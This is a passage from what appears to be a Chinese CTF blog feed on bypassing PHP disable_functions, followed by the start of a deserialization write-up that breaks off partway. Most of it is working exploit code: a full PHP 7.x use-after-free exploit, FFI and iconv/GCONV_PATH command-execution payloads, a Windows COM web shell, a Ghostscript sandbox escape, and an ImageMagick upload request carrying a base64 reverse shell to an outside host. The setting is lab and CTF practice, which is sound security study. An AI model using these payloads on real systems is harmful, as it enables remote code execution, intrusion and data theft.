class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><span class="hljs-comment">#</span><span class="hljs-comment"># <span class="hljs-doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span><span class="hljs-comment"># debug_backtrace() returns a reference to a variable </span><span class="hljs-comment"># that has been destroyed, causing a UAF vulnerability.</span><span class="hljs-comment">#</span><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.4 versions</span><span class="hljs-comment"># released as of 30/01/2020.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Author: https://github.com/mm0r1</span>pwn(<span class="hljs-string">&quot;uname -a&quot;</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">$cmd</span>) </span>&#123;    <span class="hljs-keyword">global</span> $abc, $helper, $backtrace;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;        <span class="hljs-keyword">public</span> $a;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;             <span class="hljs-keyword">global</span> $backtrace;             <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);            $backtrace = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace(); <span class="hljs-comment"># ;)</span>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($backtrace[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span>                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;        <span class="hljs-keyword">public</span> $a, $b, $c, $d;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;$str, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        $address = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($j = $s<span class="hljs-number">-1</span>; $j &gt;= <span class="hljs-number">0</span>; $j--) &#123;            $address &lt;&lt;= <span class="hljs-number">8</span>;            $address |= ord($str[$p+$j]);        &#125;        <span class="hljs-keyword">return</span> $address;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params">$ptr, $m = <span class="hljs-number">8</span></span>) </span>&#123;        $out = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; <span class="hljs-number">0xff</span>);            $ptr &gt;&gt;= <span class="hljs-number">8</span>;        &#125;        <span class="hljs-keyword">return</span> $out;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;$str, $p, $v, $n = <span class="hljs-number">8</span></span>) </span>&#123;        $i = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n; $i++) &#123;            $str[$p + $i] = chr($v &amp; <span class="hljs-number">0xff</span>);            $v &gt;&gt;= <span class="hljs-number">8</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params">$addr, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        <span class="hljs-keyword">global</span> $abc, $helper;        write($abc, <span class="hljs-number">0x68</span>, $addr + $p - <span class="hljs-number">0x10</span>);        $leak = strlen($helper-&gt;a);        <span class="hljs-keyword">if</span>($s != <span class="hljs-number">8</span>) &#123; $leak %= <span class="hljs-number">2</span> &lt;&lt; ($s * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;        <span class="hljs-keyword">return</span> $leak;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params">$base</span>) </span>&#123;        $e_type = leak($base, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);        $e_phoff = leak($base, <span class="hljs-number">0x20</span>);        $e_phentsize = leak($base, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);        $e_phnum = leak($base, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);            $p_flags = leak($header, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);            $p_vaddr = leak($header, <span class="hljs-number">0x10</span>);            $p_memsz = leak($header, <span class="hljs-number">0x28</span>);            <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span>                <span class="hljs-comment"># handle pie</span>                $data_addr = $e_type == <span class="hljs-number">2</span> ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span>                $text_size = $p_memsz;            &#125;        &#125;        <span class="hljs-keyword">if</span>(!$data_addr || !$text_size || !$data_size)            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-keyword">return</span> [$data_addr, $text_size, $data_size];    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params">$base, $elf</span>) </span>&#123;        <span class="hljs-keyword">list</span>($data_addr, $text_size, $data_size) = $elf;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $data_size / <span class="hljs-number">8</span>; $i++) &#123;            $leak = leak($data_addr, $i * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x746e6174736e6f63</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            $leak = leak($data_addr, ($i + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x786568326e6962</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            <span class="hljs-keyword">return</span> $data_addr + $i * <span class="hljs-number">8</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params">$binary_leak</span>) </span>&#123;        $base = <span class="hljs-number">0</span>;        $start = $binary_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">0x1000</span>; $i++) &#123;            $addr = $start - <span class="hljs-number">0x1000</span> * $i;            $leak = leak($addr, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);            <span class="hljs-keyword">if</span>($leak == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span>                <span class="hljs-keyword">return</span> $addr;            &#125;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params">$basic_funcs</span>) </span>&#123;        $addr = $basic_funcs;        <span class="hljs-keyword">do</span> &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);            <span class="hljs-keyword">if</span>($f_name == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span>                <span class="hljs-keyword">return</span> leak($addr + <span class="hljs-number">8</span>);            &#125;            $addr += <span class="hljs-number">0x20</span>;        &#125; <span class="hljs-keyword">while</span>($f_entry != <span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params">$arg</span>) </span>&#123;        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span>        $arg = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));        $vuln = <span class="hljs-keyword">new</span> Vuln();        $vuln-&gt;a = $arg;    &#125;    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);    &#125;    $n_alloc = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span>    $contiguous = [];    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);    $abc = $backtrace[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];    $helper = <span class="hljs-keyword">new</span> Helper;    $helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">$x</span>) </span>&#123; &#125;;    <span class="hljs-keyword">if</span>(strlen($abc) == <span class="hljs-number">79</span> || strlen($abc) == <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);    &#125;    <span class="hljs-comment"># leaks</span>    $closure_handlers = str2ptr($abc, <span class="hljs-number">0</span>);    $php_heap = str2ptr($abc, <span class="hljs-number">0x58</span>);    $abc_addr = $php_heap - <span class="hljs-number">0xc8</span>;    <span class="hljs-comment"># fake value</span>    write($abc, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);    write($abc, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);    <span class="hljs-comment"># fake reference</span>    write($abc, <span class="hljs-number">0x10</span>, $abc_addr + <span class="hljs-number">0x60</span>);    write($abc, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);    $closure_obj = str2ptr($abc, <span class="hljs-number">0x20</span>);    $binary_leak = leak($closure_handlers, <span class="hljs-number">8</span>);    <span class="hljs-keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($elf = parse_elf($base))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);    &#125;    <span class="hljs-comment"># fake closure object</span>    $fake_obj_offset = <span class="hljs-number">0xd0</span>;    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">0x110</span>; $i += <span class="hljs-number">8</span>) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    <span class="hljs-comment"># pwn</span>    write($abc, <span class="hljs-number">0x20</span>, $abc_addr + $fake_obj_offset);    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span>    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, $zif_system); <span class="hljs-comment"># internal func handler</span>    ($helper-&gt;b)($cmd);    <span class="hljs-keyword">exit</span>();&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150029505.png"></p><h2 id="FFI-扩展"><a href="#FFI-扩展" class="headerlink" title="FFI 扩展"></a>FFI 扩展</h2><blockquote><p>For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.</p></blockquote><p>通过FFI来调用C中的system进而达到执行命令的目的</p><p><a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式</a></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150028144.png"></p><p><code>exp.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);$ffi-&gt;system(<span class="hljs-string">&quot;tac /flag &gt;/tmp/1&quot;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/1&quot;</span>);@unlink(<span class="hljs-string">&quot;/tmp/1&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150028703.png"></p><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><p><code>/tmp</code>下上传<code>gconv-modules</code></p><blockquote><p>module  PAYLOAD//    INTERNAL    ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/.38277ant_x64    2<br>module  INTERNAL    PAYLOAD//    ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/.38277ant_x64    2</p></blockquote><p><code>payload.c</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv</span><span class="hljs-params">()</span> </span>&#123;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv_init</span><span class="hljs-params">()</span> </span>&#123;  system(<span class="hljs-string">&quot;/readflag &gt; /tmp/flag&quot;</span>);&#125;</code></pre><p>编译</p><p><code>gcc payload.c -o .38277ant_x64.so -shared -fPIC</code></p><p>上传so文件</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    putenv(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);    iconv(<span class="hljs-string">&quot;.38277ant_x64&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>或者插件一把梭</p><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p><a href="https://www.anquanke.com/post/id/208451#h2-8">https://www.anquanke.com/post/id/208451#h2-8</a></p><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><blockquote><p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等</p><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick 6.9.3-9</p></blockquote><p>这里用vulhub的靶场</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142105344.png"></p><p><code>http://ip:8080</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150027187.png"></p><p><code>index.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_FILES)):$ext = pathinfo($_FILES[<span class="hljs-string">&#x27;file_upload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<span class="hljs-keyword">if</span> (!in_array($ext, [<span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>])) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Unsupported filetype uploaded.&#x27;</span>);&#125;$size = shell_exec(<span class="hljs-string">&quot;identify -format &#x27;%w x %h&#x27; <span class="hljs-subst">&#123;$_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;]&#125;</span>&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Image size is: <span class="hljs-subst">$size</span>&quot;</span>;<span class="hljs-keyword">else</span>:<span class="hljs-meta">?&gt;</span>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    File: &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file_upload&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;&lt;/form&gt;<span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">endif</span>;</code></pre><p>poc</p><pre><code class="hljs txt">POST / HTTP/1.1Host: 192.168.17.131:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------51311702611553780672132934630Content-Length: 441Origin: http://192.168.17.131:8080Connection: closeReferer: http://192.168.17.131:8080/Upgrade-Insecure-Requests: 1-----------------------------51311702611553780672132934630Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;1.gif&quot;Content-Type: application/octet-streampush graphic-contextviewbox 0 0 640 480fill &#x27;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTcuMTI4Lzk5OTkgMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;pop graphic-context-----------------------------51311702611553780672132934630--</code></pre><p><code>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTcuMTI4Lzk5OTkgMD4mMQ==</code>—-&gt;</p><p><code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.17.128/9999 0&gt;&amp;1</code></p><p>监听端口反弹到shell</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142109006.png"></p><h2 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件</h2><blockquote><p>window下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152201775.png"></p><pre><code class="hljs php"><span class="hljs-comment">//exp.php</span><span class="hljs-meta">&lt;?php</span>$command = $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];$wsh = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>); <span class="hljs-comment">// 生成一个COM对象　Shell.Application也能</span>$exec = $wsh-&gt;exec(<span class="hljs-string">&quot;cmd /c&quot;</span>.$command); <span class="hljs-comment">//调用对象方法来执行命令</span>$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();<span class="hljs-keyword">echo</span> $stroutput;<span class="hljs-meta">?&gt;</span></code></pre><h2 id="利用-GhostScript-沙箱绕过-RCE-漏洞"><a href="#利用-GhostScript-沙箱绕过-RCE-漏洞" class="headerlink" title="利用 GhostScript 沙箱绕过 RCE 漏洞"></a>利用 GhostScript 沙箱绕过 RCE 漏洞</h2><blockquote><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><p>GhostScript 版本 &lt; 9.26</p></blockquote><p>vulhub靶场</p><p><code>docker-compose up -d</code></p><p><a href="http://192.168.17.131:8080/">http://192.168.17.131:8080/</a></p><p><code>index.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_FILES)):$ext = pathinfo($_FILES[<span class="hljs-string">&#x27;file_upload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<span class="hljs-keyword">if</span> (!in_array($ext, [<span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>])) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Unsupported filetype uploaded.&#x27;</span>);&#125;$size = shell_exec(<span class="hljs-string">&quot;identify -format &#x27;%w x %h&#x27; <span class="hljs-subst">&#123;$_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;]&#125;</span>&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Image size is: <span class="hljs-subst">$size</span>&quot;</span>;<span class="hljs-keyword">else</span>:<span class="hljs-meta">?&gt;</span>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    File: &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file_upload&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;&lt;/form&gt;<span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">endif</span>;</code></pre><p><code>exp.png</code></p><pre><code class="hljs txt">%!PS% extract .actual_pdfpaintproc operator from pdfdict/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def/exploit &#123;    (Stage 11: Exploitation...)=    /forceput exch def    systemdict /SAFER false forceput    userparams /LockFilePermissions false forceput    systemdict /userparams get /PermitFileControl [(*)] forceput    systemdict /userparams get /PermitFileWriting [(*)] forceput    systemdict /userparams get /PermitFileReading [(*)] forceput    % update    save restore    % All done.    stop&#125; deferrordict /typecheck &#123;    /typecount typecount 1 add def    (Stage 10: /typecheck #)=only typecount ==    % The first error will be the .knownget, which we handle and setup the    % stack. The second error will be the ifelse (missing boolean), and then we    % dump the operands.    typecount 1 eq &#123; null &#125; if    typecount 2 eq &#123; pop 7 get exploit &#125; if    typecount 3 eq &#123; (unexpected)= quit &#125;  if&#125; put% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some% executable arrays onto the operand stack that contain .forceput, but are not% marked as executeonly or pseudo-operators.%% The routine was attempting to pass them to ifelse, but we can cause that to% fail because when the routine was declared, it used `bind` but many of the% names it uses are not operators and so are just looked up in the dictstack.%% This means we can push a dict onto the dictstack and control how the routine% works.&lt;&lt;    /typecount      0    /PDFfile        &#123; (Stage 0: PDFfile)= currentfile &#125;    /q              &#123; (Stage 1: q)= &#125; % no-op    /oget           &#123; (Stage 3: oget)= pop pop 0 &#125; % clear stack    /pdfemptycount  &#123; (Stage 4: pdfemptycount)= &#125; % no-op    /gput           &#123; (Stage 5: gput)= &#125;  % no-op    /resolvestream  &#123; (Stage 6: resolvestream)= &#125; % no-op    /pdfopdict      &#123; (Stage 7: pdfopdict)= &#125; % no-op    /.pdfruncontext &#123; (Stage 8: .pdfruncontext)= 0 1 mark &#125; % satisfy counttomark and index    /pdfdict        &#123; (Stage 9: pdfdict)=        % cause a /typecheck error we handle above        true    &#125;&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=% Demonstrate reading a file we shouldnt have access to.(/etc/passwd) (r) file dup 64 string readline pop == closefile(Attempting to execute a shell command...)= flush% run command(%pipe%cat /etc/passwd &gt; /var/www/html/res.txt) (w) file closefile(All done.)=quit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142208537.png"></p><h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><p><a href="https://cloud.tencent.com/developer/article/1944129">https://cloud.tencent.com/developer/article/1944129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phpinfo&quot;&gt;&lt;a href=&quot;#phpinfo&quot; class=&quot;headerlink&quot; title=&quot;phpinfo&quot;&gt;&lt;/a&gt;phpinfo&lt;/h2&gt;&lt;p&gt;拿到&lt;code&gt;phpinfo&lt;/code&gt;后需要关注的对象&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PHP Va</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="bypass_disable_function" scheme="http://lll-nnn.github.io/tags/bypass-disable-function/"/>
    
  </entry>
  
  <entry>
    <title>2022DASXSU</title>
    <link href="http://lll-nnn.github.io/2022/04/09/2022DASXSU/"/>
    <id>http://lll-nnn.github.io/2022/04/09/2022DASXSU/</id>
    <published>2022-04-09T14:53:21.000Z</published>
    <updated>2022-04-10T12:41:31.505Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><code>反序列化</code></p><p>poc</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">crow</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $v1;    <span class="hljs-keyword">public</span> $v2;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">$this</span>-&gt;v1(<span class="hljs-keyword">$this</span>-&gt;v2);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;v1-&gt;world();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $f1;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;f1 . <span class="hljs-string">&#x27;114514&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        (<span class="hljs-keyword">$this</span>-&gt;f1)();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$a, $b</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;f1-&gt;get_flag();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">what</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $a;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;a-&gt;run();        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mix</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $m1;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        (<span class="hljs-keyword">$this</span>-&gt;m1)();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span 